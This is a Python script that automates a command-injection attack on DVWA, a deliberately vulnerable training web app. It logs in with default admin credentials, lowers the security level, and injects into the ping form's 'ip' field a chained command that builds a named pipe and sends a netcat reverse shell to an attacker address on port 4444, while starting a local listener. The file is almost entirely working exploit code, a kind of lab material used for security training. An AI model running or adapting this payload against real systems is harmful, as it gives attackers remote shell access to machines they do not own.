# Tested on Windows against DVWA within the OWASP Broken Web App VM Version 1.2

import logging
from bs4 import BeautifulSoup
import sys
import os
import mechanize
from colorama import Fore, Style

#RHOST = "192.168.0.8"

if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(filename='logs/command_execution.log', level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(name)s %(message)s')
logger = logging.getLogger(__name__)

RHOST = "192.168.0.7" # IP DVWA
LHOST = "192.168.0.3"  # IP Attacker
LPORT = "4444"  # Port

class CmdInjector:
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        # self.br.set_debug_http(True)
        # br.set_debug_redirects(True)
        # br.set_debug_responses(True)

    def login(self):
        try:
            #self.br.open("http://" + RHOST)
            self.br.open("http://" + RHOST + "/dvwa")
            self.br.select_form(nr=0)

            self.br.form['username'] = 'admin'
            self.br.form['password'] = 'password'
            self.br.submit()

            self.br.follow_link(url_regex=r'security.php')
            self.br.select_form(nr=0)  # selects the form
            self.br.form['security'] = ["low"]  # changes the security setting to low
            res = self.br.submit()
            content = res.read()
            self.soup = BeautifulSoup(content, 'html.parser')

            get_seclevel = self.soup.find("em")
            seclevel = str(get_seclevel).split("<em>")[1].replace("</em>", "")
            def sEClevel():
                if seclevel == 'high':
                    print("- Security Level:",Fore.LIGHTRED_EX, Style.BRIGHT, seclevel , Style.RESET_ALL)
                elif seclevel == 'medium':
                    print("- Security Level:",Fore.YELLOW, Style.BRIGHT, seclevel, Style.RESET_ALL)
                elif seclevel == 'low':
                    print("- Security Level:",Fore.LIGHTGREEN_EX, Style.BRIGHT, seclevel, Style.RESET_ALL)
                else:
                    print("FUCK OFF")


            print("-" * 55)
            print("- " + self.br.title())
            sEClevel()
            print("-" * 55 )

        except Exception as e:
            logger.error(e)
            print(e)

    def execute_cmd(self):
        self.br.follow_link(url_regex=r'exec')
        self.br.select_form(nr=0)  # select the form

        print("- Starting listener:", LPORT)
        print("- Injecting command:")
        self.br.form[
            'ip'] = 'google.com && rm -f /tmp/backpipe && mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc %s %s 1>/tmp/backpipe' % (
            LHOST, LPORT)
        self.br.submit()  # submits the form and the shell should come


    def listener(self):
        """start netcat listening on selected port"""
        if sys.platform == "linux" or sys.platform == "linux2":
            print("Please run nc -nlvp 4444 in a new shell")
        elif sys.platform == "darwin":
            print("Please run nc -nlvp 4444 in a new shell")
        elif sys.platform == "win32":
            os.system(r'start cmd.exe /k "nc -lvp" ' + str(LPORT))


def main():
    automate = CmdInjector()
    automate.listener()
    automate.login()
    automate.execute_cmd()



if __name__ == '__main__':
    main()